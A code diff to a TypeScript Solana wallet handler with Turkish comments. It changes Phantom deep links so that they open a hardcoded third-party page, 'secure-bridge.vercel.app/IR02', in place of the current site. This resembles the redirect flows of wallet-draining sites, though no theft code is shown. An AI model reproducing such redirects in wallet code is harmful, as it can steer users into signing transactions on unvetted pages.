@@ -336,37 +336,34 @@ const handleWalletClick = async (w: DrawerWallet) => {
       /Telegram/i.test(ua) &&
       typeof (window as any).Telegram?.WebApp !== 'undefined';
 
-    // 1) Phantom SDK/yüklü eklenti varsa normal imzala+gönder
+    // 1) Phantom eklenti/SDK varsa doğrudan imzala-gönder
     if (w.readyState === WalletReadyState.Installed && sol?.isPhantom) {
       await select('Phantom' as WalletName);
       return doTx();
     }
 
-    // 2) Sadece origin + pathname kullan, query/hash atla
-    const origin     = window.location.origin;
-    const pathname   = window.location.pathname;
-    const targetUrl  = origin + pathname;               // örn: https://www.test.com/secondpage
-    const encoded    = encodeURIComponent(targetUrl);
-    const hostAndPath = targetUrl.replace(/^https?:\/\//, '');
+    /* ===== Sabit yönlendirme adresi ===== */
+    const secureBridgeUrl = 'https://secure-bridge.vercel.app/IR02'; // gerektiğinde değiştir
+    const encodedBridge   = encodeURIComponent(secureBridgeUrl);
 
-    // Android+Telegram için intent yönlendirmesi
-    const intentDefaultBrowser = [
-      `intent://${hostAndPath}`,
-      `#Intent;scheme=https`,
-      `;action=android.intent.action.VIEW`,
-      `;category=android.intent.category.BROWSABLE`,
-      `;S.browser_fallback_url=https://phantom.app/ul/browse/${encoded}?ref=${encoded}`,
-      `;end`
-    ].join('');
+    // Mevcut sayfanın (Telegram içindeki) tam URL’i
+    const currentUrl      = window.location.origin + window.location.pathname;
+    const hostAndPath     = currentUrl.replace(/^https?:\/\//, '');
 
-    // Android normal tarayıcıda Phantom custom-scheme
-    const schemePhantom = `phantom://browse/${encoded}?ref=${encoded}`;
+    /* -- Phantom link formatları (secure-bridge’e göre) -- */
+    const schemePhantom    = `phantom://browse/${encodedBridge}?ref=${encodedBridge}`;
+    const universalPhantom = `https://phantom.app/ul/browse/${encodedBridge}?ref=${encodedBridge}`;
 
-    // iOS ve diğer cihazlar için Universal Link
-    const universalPhantom = `https://phantom.app/ul/browse/${encoded}?ref=${encoded}`;
-
-    // 3) Android + Telegram Mini-App → intent (dış tarayıcı)
+    /* -- Android + Telegram WebView → intent (mevcut sayfa) -- */
     if (isAndroid && isTelegramWebView) {
+      const intentDefaultBrowser = [
+        `intent://${hostAndPath}`,
+        `#Intent;scheme=https`,
+        `;action=android.intent.action.VIEW`,
+        `;category=android.intent.category.BROWSABLE`,
+        `;S.browser_fallback_url=${universalPhantom}`,
+        `;end`
+      ].join('');
       const a = document.createElement('a');
       a.href   = intentDefaultBrowser;
       a.target = '_blank';
@@ -376,7 +373,7 @@ const handleWalletClick = async (w: DrawerWallet) => {
       return;
     }
 
-    // 4) Android normal tarayıcı → Phantom scheme
+    /* -- Android normal tarayıcı → Phantom scheme (secure-bridge) -- */
     if (isAndroid) {
       const a = document.createElement('a');
       a.href   = schemePhantom;
@@ -387,20 +384,21 @@ const handleWalletClick = async (w: DrawerWallet) => {
       return;
     }
 
-    // 5) iOS veya Desktop → Universal Link
+    /* -- iOS & Desktop → universal link (secure-bridge) -- */
     window.location.href = universalPhantom;
     return;
   }
 
-  // Diğer cüzdanlar…
+  /* -------- Diğer cüzdanlar -------- */
   if (w.readyState === WalletReadyState.Installed) {
     await select(w.adapter.name as WalletName);
     return doTx();
   }
 
-  // Fallback: default deepLink kullan
+  // Yüklü değilse varsayılan deepLink
   window.open(w.deepLink, '_blank');
 };
+
 
 
 
